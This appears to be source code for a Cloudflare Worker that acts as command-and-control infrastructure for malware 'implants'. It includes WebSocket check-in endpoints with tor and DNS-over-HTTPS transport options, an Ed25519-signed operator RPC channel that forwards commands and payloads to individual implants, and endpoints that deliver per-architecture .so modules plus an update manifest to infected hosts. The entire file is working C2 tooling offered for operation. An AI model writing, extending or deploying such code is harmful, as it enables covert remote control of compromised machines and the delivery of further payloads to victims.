import { Hono } from 'hono';
import { ed25519 } from '@noble/curves/ed25519';

// Cloudflare Environment bindings
export interface Env {
  IMPLANT_STATE: DurableObjectNamespace;
  STORAGE: R2Bucket;
  FLEET_CONFIG: KVNamespace;
  OPERATOR_PUBKEY: string;
}

const app = new Hono<{ Bindings: Env }>();

// 1. Implant Transport Endpoint (WebSocket Upgrade)
app.get('/t/:transport/:implantId', async (c) => {
  const upgradeHeader = c.req.header('Upgrade');
  if (upgradeHeader !== 'websocket') {
    return c.text('Expected Upgrade: websocket', 426);
  }

  const implantId = c.req.param('implantId');
  const transport = c.req.param('transport'); // e.g. wss, tor, doh
  
  // Route to the specific Durable Object for this implant
  const id = c.env.IMPLANT_STATE.idFromName(implantId);
  const stub = c.env.IMPLANT_STATE.get(id);

  // Pass the request to the DO
  return stub.fetch(c.req.raw);
});

// 2. Operator API (REST/RPC for the Kotlin app)
// Protected by Ed25519 signature verification
app.post('/api/rpc', async (c) => {
  const sigHex = c.req.header('X-Signature');
  const timestamp = c.req.header('X-Timestamp');
  
  if (!sigHex || !timestamp) {
    return c.json({ error: 'Missing X-Signature or X-Timestamp header' }, 401);
  }

  // Reject requests older than 60 seconds (replay protection)
  const now = Math.floor(Date.now() / 1000);
  const ts = parseInt(timestamp);
  if (Math.abs(now - ts) > 60) {
    return c.json({ error: 'Timestamp too old. Replay attack?' }, 401);
  }

  const body = await c.req.text();
  
  // Verify Ed25519 signature: sign(timestamp + body)
  const message = new TextEncoder().encode(timestamp + body);
  const signature = Uint8Array.from(sigHex.match(/.{2}/g)!.map((h: string) => parseInt(h, 16)));
  const pubkey = Uint8Array.from(
    (c.env.OPERATOR_PUBKEY).match(/.{2}/g)!.map((h: string) => parseInt(h, 16))
  );

  let isValid = false;
  try {
    isValid = ed25519.verify(signature, message, pubkey);
  } catch (e) {
    return c.json({ error: 'Signature verification failed' }, 401);
  }

  if (!isValid) {
    return c.json({ error: 'Invalid signature' }, 403);
  }

  // Parse the verified request
  const { implantId, command, payload } = JSON.parse(body);

  const id = c.env.IMPLANT_STATE.idFromName(implantId);
  const stub = c.env.IMPLANT_STATE.get(id);
  
  // Forward RPC command to the Durable Object
  return stub.fetch(new Request(`http://do/rpc`, {
    method: 'POST',
    body: JSON.stringify({ command, payload })
  }));
});

// 3. Module Delivery Endpoint
app.get('/modules/:architecture/:name', async (c) => {
  const name = c.req.param('name');
  const arch = c.req.param('architecture');
  
  // R2 keys already include the .so extension — don't append it
  const object = await c.env.STORAGE.get(`modules/${arch}/${name}`);
  if (!object) return c.notFound();

  const headers = new Headers();
  object.writeHttpMetadata(headers);
  headers.set('etag', object.httpEtag);
  
  return new Response(object.body, { headers });
});

// 4. Module Manifest Endpoint (for the implant's updater)
app.get('/modules/manifest.json', async (c) => {
  const object = await c.env.STORAGE.get(`modules/manifest.json`);
  if (!object) {
    return c.json({ modules: [] });
  }

  const headers = new Headers();
  object.writeHttpMetadata(headers);
  headers.set('etag', object.httpEtag);
  headers.set('Content-Type', 'application/json');
  
  return new Response(object.body, { headers });
});

// The Durable Object Class exported for Cloudflare
export { ImplantDO } from './durable-object';
export default app;
